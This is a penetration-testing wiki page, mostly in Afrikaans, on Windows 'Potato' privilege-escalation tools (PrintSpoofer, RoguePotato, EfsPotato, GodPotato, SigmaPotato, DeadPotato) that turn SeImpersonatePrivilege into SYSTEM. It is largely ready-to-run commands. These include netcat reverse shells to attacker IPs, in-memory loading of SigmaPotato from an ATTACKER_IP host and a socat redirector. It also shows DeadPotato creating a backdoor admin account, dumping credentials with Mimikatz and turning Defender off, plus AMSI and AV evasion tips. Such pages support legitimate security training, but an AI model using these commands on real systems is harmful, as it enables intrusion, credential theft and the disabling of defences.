# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> 'n Moderne alternatief wat gereeld in 2024–2025 onderhou word is SigmaPotato (a fork of GodPotato) wat in-memory/.NET reflection gebruik en uitgebreide OS-ondersteuning byvoeg. Sien vinnige gebruik hieronder en die repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Vereistes en algemene valkuils

Al die volgende tegnieke berus op die misbruik van 'n bevoorregte diens wat impersonation ondersteun, vanuit 'n konteks wat een van die volgende voorregte het:

- SeImpersonatePrivilege (die mees algemene) of SeAssignPrimaryTokenPrivilege
- Hoë integriteit is nie nodig nie as die token reeds SeImpersonatePrivilege het (tipies vir baie diensrekeninge soos IIS AppPool, MSSQL, ens.)

Kontroleer voorregte vinnig:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- As jou shell onder 'n beperkte token loop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sommige kontekste), herstel die rekening se standaard-privilege met FullPowers, en voer dan 'n Potato uit. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In geharde omgewings waar Spooler na PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benodig 'n OXID resolver wat bereikbaar is op TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende/onondersteunde RPC authentication service; probeer 'n ander pipe/transport of verseker dat die target service loop.
- “Kitchen-sink” forks soos DeadPotato bundel ekstra payload modules (Mimikatz/SharpHound/Defender off) wat die disk raak; verwag hoër EDR detection in vergelyking met die slim originals.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Aantekeninge:
- Jy kan -i gebruik om 'n interaktiewe proses in die huidige console te begin, of -c om 'n one-liner uit te voer.
- Vereis Spooler service. As dit gedeaktiveer is, sal dit misluk.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Indien uitgaande poort 135 geblokkeer is, pivot the OXID resolver via socat op jou redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato is 'n nuwer COM-misbruik-primitive wat laat in 2022 vrygestel is en mik op die **PrintNotify** diens in plaas van Spooler/BITS. Die binêre instansieer die PrintNotify COM-bediener, vervang `IUnknown` met 'n vals een, en aktiveer dan 'n bevoorregte callback deur `CreatePointerMoniker`. Wanneer die PrintNotify-diens (lopend as **SYSTEM**) terug koppel, dupliseer die proses die teruggegewe token en spawnt die verskafde payload met volle voorregte.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Aanvaar óf 'n direkte opdrag óf 'n interaktiewe modus, sodat jy in die oorspronklike konsole kan bly. Voorbeeld:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Omdat dit suiwer COM-gebaseer is, word geen named-pipe listeners of external redirectors vereis nie, wat dit 'n drop-in vervanging maak op hosts waar Defender RoguePotato se RPC-binding blokkeer.

Operateurs soos Ink Dragon voer PrintNotifyPotato onmiddellik uit nadat hulle ViewState RCE op SharePoint verkry het, om van die `w3wp.exe` worker na SYSTEM te pivot voor hulle ShadowPad installeer.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wenk: As een pipe misluk of EDR dit blokkeer, probeer die ander ondersteunde pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Aantekeninge:
- Werk op Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege teenwoordig is.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato verskaf twee variante wat mik op service DCOM-objekte wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE staan. Kompileer of gebruik die voorsiene binaries en voer jou opdrag uit:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (opgedateerde GodPotato fork)

SigmaPotato voeg moderne gerieflike funksies by, soos in-memory execution via .NET reflection en 'n PowerShell reverse shell-hulpmiddel.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Bykomende voordele in 2024–2025 weergawes (v1.2.x):
- Ingeboude reverse shell-flag `--revshell` en verwydering van die 1024-teken PowerShell-beperking sodat jy lang AMSI-bypassende payloads in een slag kan stuur.
- Reflectie-vriendelike sintaksis (`[SigmaPotato]::Main()`), plus 'n basiese AV-ontduikingstruk via `VirtualAllocExNuma()` om eenvoudige heuristieke te mislei.
- Afsonderlike `SigmaPotatoCore.exe` gecompileer teen .NET 2.0 vir PowerShell Core-omgewings.

### DeadPotato (2024 GodPotato-herwerking met modules)

DeadPotato behou die GodPotato OXID/DCOM impersonation chain, maar inkorporeer post-exploitation helpers sodat operators onmiddellik SYSTEM kan neem en persistence/collection kan uitvoer sonder bykomende gereedskap.

Gereelde modules (al vereis SeImpersonatePrivilege):

- `-cmd "<cmd>"` — voer 'n arbitrêre opdrag as SYSTEM uit.
- `-rev <ip:port>` — vinnige reverse shell.
- `-newadmin user:pass` — skep 'n plaaslike admin vir persistence.
- `-mimi sam|lsa|all` — laat val en voer Mimikatz uit om credentials te dump (skryf na skyf, lawaaiig).
- `-sharphound` — voer SharpHound-collection as SYSTEM uit.
- `-defender off` — skakel Defender real-time beskerming af (baie lawaaiig).

Voorbeeld eenreëls:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Omdat dit ekstra binaries meebring, verwag hoër AV/EDR flags; gebruik die slankere GodPotato/SigmaPotato wanneer stealth saak maak.

## Verwysings

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
